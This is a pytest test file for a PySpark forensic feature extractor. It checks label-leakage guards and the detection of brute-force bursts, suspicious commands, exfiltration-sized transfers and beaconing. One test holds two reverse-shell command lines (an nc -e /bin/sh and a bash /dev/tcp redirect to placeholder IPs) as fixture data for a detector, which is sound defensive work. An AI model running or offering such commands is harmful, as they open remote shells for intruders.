"""Windowed feature extraction, including label-leakage guards."""

from __future__ import annotations

import datetime as dt

import pytest
from pyspark.sql.types import (
    BooleanType,
    IntegerType,
    LongType,
    StringType,
    StructField,
    StructType,
    TimestampType,
)

from forensics.streaming.features import (
    EXCLUDED_FROM_FEATURES,
    assert_no_label_leakage,
    host_activity_features,
    peer_connection_features,
)

# The shape flatten() produces, declared once so tests can build rows cheaply.
NORMALIZED_SCHEMA = StructType(
    [
        StructField("event_id", StringType()),
        StructField("event_time", TimestampType()),
        StructField("category", StringType()),
        StructField("action", StringType()),
        StructField("outcome", StringType()),
        StructField("severity", IntegerType()),
        StructField("message", StringType()),
        StructField("host_name", StringType()),
        StructField("user_name", StringType()),
        StructField("user_uid", IntegerType()),
        StructField("process_name", StringType()),
        StructField("process_command_line", StringType()),
        StructField("source_ip", StringType()),
        StructField("destination_ip", StringType()),
        StructField("destination_port", IntegerType()),
        StructField("bytes_sent", LongType()),
        StructField("direction", StringType()),
        StructField("eval_is_anomaly", BooleanType()),
        StructField("eval_scenario", StringType()),
        StructField("eval_campaign_id", StringType()),
        StructField("eval_step", IntegerType()),
    ]
)

BASE = dt.datetime(2026, 9, 9, 12, 0, 0)


def _row(**kw):
    defaults = {
        "event_id": "e", "event_time": BASE, "category": "network", "action": "a",
        "outcome": "success", "severity": 6, "message": "m",
        "host_name": "web-01.corp.local", "user_name": "a.sharma", "user_uid": 1001,
        "process_name": None, "process_command_line": None, "source_ip": None,
        "destination_ip": None, "destination_port": None, "bytes_sent": None,
        "direction": None, "eval_is_anomaly": None, "eval_scenario": None,
        "eval_campaign_id": None, "eval_step": None,
    }
    defaults.update(kw)
    return tuple(defaults[f.name] for f in NORMALIZED_SCHEMA.fields)


def _df(spark, rows):
    return spark.createDataFrame(rows, NORMALIZED_SCHEMA)


# --------------------------------------------------------------------------- #
# Label leakage                                                                #
# --------------------------------------------------------------------------- #

def test_host_features_contain_no_evaluation_labels(spark) -> None:
    features = host_activity_features(_df(spark, [_row()]))
    assert not set(features.columns) & set(EXCLUDED_FROM_FEATURES)
    assert_no_label_leakage(features)


def test_peer_features_contain_no_evaluation_labels(spark) -> None:
    features = peer_connection_features(
        _df(spark, [_row(destination_ip="203.0.113.5", bytes_sent=1000)])
    )
    assert not set(features.columns) & set(EXCLUDED_FROM_FEATURES)
    assert_no_label_leakage(features)


def test_leakage_guard_actually_fires(spark) -> None:
    """The guard must fail on a frame that does carry a label."""
    leaky = _df(spark, [_row(eval_is_anomaly=True)])
    with pytest.raises(ValueError, match="leaked into feature frame"):
        assert_no_label_leakage(leaky)


# --------------------------------------------------------------------------- #
# Host activity                                                                #
# --------------------------------------------------------------------------- #

def test_brute_force_shows_as_failure_burst_from_one_source(spark) -> None:
    rows = [
        _row(
            event_time=BASE + dt.timedelta(seconds=i),
            category="authentication", outcome="failure",
            source_ip="203.0.113.9", severity=4,
        )
        for i in range(30)
    ]
    features = host_activity_features(_df(spark, rows)).collect()
    peak = max(features, key=lambda r: r["auth_failure_count"])

    assert peak["auth_failure_count"] >= 25
    assert peak["auth_failure_ratio"] == pytest.approx(1.0)
    # One attacker, not thirty users logging in.
    assert peak["distinct_source_ips"] == 1


def test_normal_logins_do_not_look_like_a_burst(spark) -> None:
    rows = [
        _row(
            event_time=BASE + dt.timedelta(seconds=i * 2),
            category="authentication",
            outcome="failure" if i % 12 == 0 else "success",
            source_ip=f"10.20.1.{i}", user_name=f"user{i}",
        )
        for i in range(30)
    ]
    peak = max(host_activity_features(_df(spark, rows)).collect(),
               key=lambda r: r["auth_failure_ratio"])
    assert peak["auth_failure_ratio"] < 0.25


def test_auth_failure_ratio_is_zero_when_no_auth_events(spark) -> None:
    """Must not divide by zero on a window of pure network traffic."""
    features = host_activity_features(_df(spark, [_row(category="network")])).collect()
    assert all(r["auth_failure_ratio"] == 0.0 for r in features)


def test_suspicious_commands_are_counted(spark) -> None:
    rows = [
        _row(category="process", process_name="nc",
             process_command_line="nc -e /bin/sh 203.0.113.66 4444"),
        _row(category="process", process_name="bash",
             process_command_line="bash -i >& /dev/tcp/198.51.100.23/9001 0>&1"),
        _row(category="process", process_name="ls", process_command_line="ls -la /home"),
    ]
    peak = max(host_activity_features(_df(spark, rows)).collect(),
               key=lambda r: r["suspicious_command_count"])
    assert peak["suspicious_command_count"] == 2


def test_root_activity_is_counted(spark) -> None:
    rows = [_row(category="process", user_uid=0), _row(category="process", user_uid=1001)]
    peak = max(host_activity_features(_df(spark, rows)).collect(),
               key=lambda r: r["root_event_count"])
    assert peak["root_event_count"] == 1


def test_exfiltration_shows_as_a_byte_volume_spike(spark) -> None:
    rows = [_row(direction="outbound", bytes_sent=1_000, destination_ip="203.0.113.5")
            for _ in range(5)]
    # Three ~900 MB transfers: the total (2.7e9) exceeds 2**31, so this genuinely
    # exercises the LongType accumulator rather than merely a large-ish int.
    rows += [_row(direction="outbound", bytes_sent=900_000_000,
                  destination_ip="203.0.113.5") for _ in range(3)]
    peak = max(host_activity_features(_df(spark, rows)).collect(),
               key=lambda r: r["bytes_sent_total"])
    assert peak["bytes_sent_max"] == 900_000_000
    assert peak["bytes_sent_total"] == 2_700_005_000
    assert peak["bytes_sent_total"] > 2**31  # would overflow IntegerType
    assert peak["outbound_flow_count"] == 8


def test_windows_are_per_host(spark) -> None:
    rows = [_row(host_name="web-01.corp.local", category="authentication", outcome="failure"),
            _row(host_name="db-01.corp.local", category="authentication", outcome="failure")]
    hosts = {r["host_name"] for r in host_activity_features(_df(spark, rows)).collect()}
    assert hosts == {"web-01.corp.local", "db-01.corp.local"}


# --------------------------------------------------------------------------- #
# Beaconing                                                                    #
# --------------------------------------------------------------------------- #

def test_regular_beacon_has_near_zero_interval_variation(spark) -> None:
    rows = [
        _row(event_time=BASE + dt.timedelta(seconds=i * 60),
             destination_ip="203.0.113.66", destination_port=443, bytes_sent=1200)
        for i in range(9)
    ]
    peak = max(peer_connection_features(_df(spark, rows)).collect(),
               key=lambda r: r["connection_count"])
    assert peak["interval_mean_seconds"] == pytest.approx(60.0, abs=1.0)
    # Metronomic: the defining property of an automated callback.
    assert peak["interval_cv"] == pytest.approx(0.0, abs=0.01)
    assert peak["bytes_sent_stddev"] == pytest.approx(0.0, abs=0.01)


def test_human_traffic_has_irregular_intervals(spark) -> None:
    offsets = [0, 7, 9, 63, 200, 205, 400, 402, 480]
    rows = [
        _row(event_time=BASE + dt.timedelta(seconds=o),
             destination_ip="203.0.113.66", destination_port=443,
             bytes_sent=1000 + o * 37)
        for o in offsets
    ]
    peak = max(peer_connection_features(_df(spark, rows)).collect(),
               key=lambda r: r["connection_count"])
    # Irregular by construction — must not be confused with a beacon.
    assert peak["interval_cv"] > 0.5


def test_single_connection_yields_null_not_fake_perfect_beacon(spark) -> None:
    """One event means no interval at all; reporting 0.0 would invent a beacon."""
    rows = [_row(destination_ip="203.0.113.66", bytes_sent=1200)]
    row = peer_connection_features(_df(spark, rows)).collect()[0]
    assert row["interval_stddev_seconds"] is None
    assert row["interval_cv"] is None


def test_two_connections_yield_null_stddev(spark) -> None:
    """A single gap has no dispersion; stddev must be null, not zero."""
    rows = [
        _row(event_time=BASE, destination_ip="203.0.113.66", bytes_sent=1200),
        _row(event_time=BASE + dt.timedelta(seconds=60),
             destination_ip="203.0.113.66", bytes_sent=1200),
    ]
    peak = max(peer_connection_features(_df(spark, rows)).collect(),
               key=lambda r: r["connection_count"])
    assert peak["interval_mean_seconds"] == pytest.approx(60.0)
    assert peak["interval_stddev_seconds"] is None


def test_peer_features_split_by_destination(spark) -> None:
    rows = [_row(destination_ip="203.0.113.1", bytes_sent=100),
            _row(destination_ip="203.0.113.2", bytes_sent=100)]
    dests = {r["destination_ip"] for r in peer_connection_features(_df(spark, rows)).collect()}
    assert dests == {"203.0.113.1", "203.0.113.2"}


def test_rows_without_destination_are_excluded(spark) -> None:
    """Auth/process events have no peer and must not create a null-keyed group."""
    rows = [_row(category="authentication", destination_ip=None),
            _row(destination_ip="203.0.113.1", bytes_sent=10)]
    results = peer_connection_features(_df(spark, rows)).collect()
    assert all(r["destination_ip"] is not None for r in results)
